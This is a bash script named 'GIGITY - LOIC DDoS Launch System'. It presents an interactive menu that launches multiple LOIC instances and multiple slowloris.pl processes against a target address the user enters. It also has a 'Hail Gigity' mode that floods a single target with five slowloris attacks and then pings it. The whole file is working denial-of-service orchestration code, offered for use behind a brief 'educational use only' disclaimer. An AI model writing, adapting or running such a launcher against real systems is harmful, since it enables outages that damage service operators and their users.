#!/bin/bash
#  G I G I T Y - LOIC DDoS Launch System
#  Christian Marvel
#  Digitalizedwarfare.com
#  This Cannot Be REMOVED. 

## ----------------------------------
# Define variables
# ----------------------------------
EDITOR=nano
PASSWD=/etc/passwd
RED='\033[0;41;30m'
STD='\033[0;0;39m'

# ----------------------------------
# Custom defined function
# ----------------------------------
pause(){
  read -p " Press [Enter] key to continue..." fackEnterKey
  clear
}

pause_loic(){
  read -p " All cannons Loaded.... Press [Enter]" fackEnterKey
  clear
}

pause_slowloris(){
  read -p " Press [Enter] key to Launch SlowLoris..." fackEnterKey
  clear
}

pause_hailgigity(){
  read -p " Press [Enter] key to Launch HAIL Gigity..." fackEnterKey
  clear
}

# LOIC Section
loic(){
	killall screen
	loic_number=0
	clear
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " G I G I T Y - LOIC DDoS Launch System "
	echo ' And as the Skies opened , it rained from the heavens, It was truly'
	echo " a astonishng sight, as I saw, Death walked the world once more......"
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " Options are : Number Instances "
	echo " "
	echo -n " Enter Number of Ion Cannons and Press [ENTER] : "
	read loic_number
	clear
	echo " Loading Ion Cannons....."
	
	loic_counter=1
	#if [ $loic_number -ne "0"]; then
        	while [ $loic_counter -le $loic_number ]; do
			echo " Starting LOIC Battery $loic_counter .... Gigity.."
			screen -a -m -d -S LOIC mono /opt/gigity/factorys/loic_beta/debug/LOIC.exe
			let loic_counter=loic_counter+1   	
 		done
		pause_loic
	#fi
}

# SlowLoris Section
slowloris(){	clear
	slowloris_number=0
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " G I G I T Y - SlowLoris DDoS Launch System "
	echo ' This animal might look like a harmless, big-eyed baby ewok,'
	echo " but the slow loris is one of the only poisonous mammals in the world."
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " Setting Up SlowLoris Options "
	echo " Options are Target and Instances "
	echo " "
	echo -n " Enter Target Address and Press [ENTER]: "
	read target_addy
	echo "  "
	echo -n " Enter Number of Instances and Press [ENTER] : "
	read slowloris_number

	pause_slowloris

	slowloris_counter=1
	if [ $slowloris_number -ne 0 ]; then
        	while [ $slowloris_counter -le $slowloris_number ]; do
			echo -n " Firing Shot $slowloris_counter.. Gigity... "
        		gnome-terminal -x bash -c "/opt/gigity/factorys/slowloris/slowloris.pl -dns $target_addy; exec $SHELL"
        		let slowloris_counter=slowloris_counter+1   	
 		done
		echo " "
       	 	pause
		gnome-terminal -x bash -c "ping $target_addy; exec $SHELL"
	fi
}

# Hail Gigity
hailgigity(){
	clear
	slowloris_number=5
	target_addy="192.168.1.15"
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " G I G I T Y - Hail Gigity Attack System "
	echo ' When all else fails? Go Gigity or Go Home!!'
	echo " Start 5 Machines on a single target!! "
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " Setting Up SlowLoris Options "
	echo " Options are Target and Instances "
	echo " "
	echo -n " Enter Target Address and Press [ENTER]: ( Example : $target_addy )"
	read target_addy

	pause_hailgigity

	slowloris_counter=1
	if [ $target_addy != 0 ]; then
        	while [ $slowloris_counter -le $slowloris_number ]; do
			echo " Firing Shot $slowloris_counter.. Gigity... "
        		gnome-terminal -x bash -c "/opt/gigity/factorys/slowloris/slowloris.pl -dns $target_addy; exec $SHELL"
        		let slowloris_counter=slowloris_counter+1   	
 		done
	
		echo " "
		echo " Starting Ping Monitor...."
		gnome-terminal -x bash -c "ping $target_addy; exec $SHELL"
		echo " "
		echo " We have reached Full Gigity Sir!!! Gigity.. Gigity.. Gigity.. "
		echo " "
		
       	 	pause
	fi
}
# Main Menu
show_menus() {
	clear
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " G I G I T Y - DDoS Launch Control System "
	echo " From this Utility you will be able to launch LOIC "
	echo " and SlowLoris Attacks Very Quickly... Gigity...   "
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " DISCLAIMER  This is for Educational Use Only. Do NOT"
	echo " USE on Machines you do not OWN or have in WRITING that"
	echo " you may do so. I am not LIABLE for any reason......"
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " 1. Go Here to Launch LOIC DDoS Attacks"
	echo " 2. Go Here to Launch SlowLoris Attacks"
	echo " 3. Go here to Launch Hail Gigity Attack"
	echo " "
	echo " 0. To Exit Gigity"
}

# Generate Menu
read_options(){
	local choice
	echo " "
	read -p " Enter choice [ 1 - 3 or 0 ] " choice
	case $choice in
		1) loic ;;
		2) slowloris ;;
		3) hailgigity 0;;
		0) exit 0;;
		*) echo -e " ${RED}Error...${STD}" && sleep 2
	esac
}

# ----------------------------------------------
# Trap CTRL+C, CTRL+Z and quit singles
# ----------------------------------------------
trap '' SIGINT SIGQUIT SIGTSTP

# -----------------------------------
# Main logic - infinite loop
# ------------------------------------
while true
do
	show_menus
	read_options
done
